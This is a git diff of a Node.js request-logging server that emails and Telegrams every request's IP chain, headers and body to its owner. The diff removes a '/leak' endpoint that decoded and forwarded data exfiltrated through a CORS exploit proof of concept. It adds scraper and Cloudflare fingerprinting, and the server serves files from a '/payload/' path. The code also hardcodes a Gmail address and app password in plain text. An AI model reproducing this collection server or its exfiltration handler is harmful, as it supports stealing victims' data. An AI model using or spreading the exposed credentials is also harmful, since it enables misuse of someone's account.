@@ -1,10 +1,9 @@
+
 const http = require('http');
 const path = require('path');
 const fs = require('fs');
 const nodemailer = require('nodemailer');
 const fetch = require('node-fetch');
-
-// === CONFIGURATION ===
 
 const gmailUser = 'mzeroaccess@gmail.com';
 const gmailPass = 'pext txcx xmsv ytbd';
@@ -79,47 +78,25 @@ const server = http.createServer((req, res) => {
             console.log(`📦 Body:\n${rawBody}`);
         }
 
-        // === CORS PoC leak handling ===
-        if (req.url === '/leak' && req.method === 'POST') {
-            let data = null;
-
-            try {
-                const jsonBody = JSON.parse(rawBody);
-                data = jsonBody.data;
-            } catch (err) {
-                console.error("❌ Couldn't parse CORS exfiltrated JSON:", err);
-            }
-
-            if (data) {
-                const decoded = Buffer.from(data, 'base64').toString('utf-8');
-                console.log("🔥 CORS Exfiltrated Data:\n", decoded);
-
-                const leakDetails = `🧠 CORS Exploit Exfiltrated Data:\n\n${decoded}`;
-
-                transporter.sendMail({
-                    from: gmailUser,
-                    to: gmailUser,
-                    subject: '🔥 CORS PoC Triggered!',
-                    text: leakDetails
-                }, (error, info) => {
-                    if (error) console.error('❌ Error sending CORS email:', error);
-                    else console.log('✅ CORS mail sent:', info.response);
-                });
-
-                sendTelegramMessage(leakDetails);
-            }
-
-            res.writeHead(200, { 'Content-Type': 'text/plain' });
-            res.end("✅ CORS data received.");
-            return;
-        }
-
         // === Normal Request Logging and Alerts ===
-        const fullRequestDetails = `⚡ New Request at ${now}!\n\n` +
-            `➡️ IP Chain: ${ipChain.join(' → ')}\n` +
-            `➡️ URL: ${req.url}\n\n` +
-            `🧠 Headers:\n${JSON.stringify(req.headers, null, 2)}\n\n` +
-            `📦 Body:\n${parsedBody || 'No Body'}`;
+        const originIP = ipChain?.[0] || 'Unknown';
+        const viaCloudflare = req.headers['cdn-loop']?.includes('cloudflare') ? '✅ via Cloudflare' : '❌ No CF';
+        const userAgent = req.headers['user-agent'] || '';
+        const isTrafilatura = userAgent.includes('trafilatura') ? '🧠 Trafilatura Detected' : '❓ Unknown Agent';
+        const referer = req.headers['referer'] || 'None';
+        const timestamp = new Date().toISOString();
+
+        const fullRequestDetails = 
+          `⚡ New Request at ${timestamp}!\n\n` +
+          `➡️ URL Accessed: ${req.url}\n` +
+          `➡️ Origin IP: ${originIP}\n` +
+          `➡️ IP Chain: ${ipChain.join(' → ')}\n` +
+          `➡️ CDN Info: ${viaCloudflare}\n` +
+          `➡️ Referrer: ${referer}\n` +
+          `➡️ Tool: ${isTrafilatura}\n` +
+          `➡️ User-Agent: ${userAgent}\n\n` +
+          `🧠 Raw Headers:\n${JSON.stringify(req.headers, null, 2)}\n\n` +
+          `📦 Body:\n${parsedBody || 'No Body'}`;
 
         transporter.sendMail({
             from: gmailUser,
@@ -132,9 +109,6 @@ const server = http.createServer((req, res) => {
         });
 
         sendTelegramMessage(fullRequestDetails);
-
-        // Serve payloads if exists
-        // res.setHeader('Access-Control-Allow-Origin', '*');
 
         const safePath = path.normalize(path.join(__dirname, 'public', req.url));
         if (safePath.startsWith(path.join(__dirname, 'public')) && req.url.startsWith('/payload/')) {
